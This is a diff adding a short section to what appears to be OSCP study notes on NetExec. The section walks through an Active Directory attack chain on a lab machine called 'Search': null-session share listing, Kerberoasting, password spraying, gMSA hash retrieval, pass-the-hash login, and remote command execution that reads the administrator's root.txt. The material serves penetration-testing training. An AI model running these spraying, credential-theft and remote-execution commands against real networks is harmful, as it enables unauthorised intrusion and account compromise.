@@ -112,3 +112,19 @@ netexec --help
 ## Related module
 
 - [[OSCP/MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow
+
+## Search: end-to-end AD use
+
+Search used NetExec for null-session observation, LDAP/SMB credential validation, share enumeration, a one-password spray, Kerberoasting, gMSA retrieval, NT-hash authentication, and final WMI command execution.
+
+~~~bash
+netexec smb $BoxIP
+netexec smb $BoxIP -u '' -p '' --shares
+netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txt
+netexec smb $BoxIP -u $BoxDir/loot/usernames.txt -p $Password2 --continue-on-success
+netexec ldap $BoxIP -u $Username4 -p $Password4 --gmsa
+netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
+netexec smb $BoxIP -u Tristan.Davies -p $Password3 -x 'type C:\Users\Administrator\Desktop\root.txt'
+~~~
+
+[+] proves authentication; Pwn3d! proves local administrator access. A successful authentication without Pwn3d! is still useful for share or LDAP enumeration. Full evidence: [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].
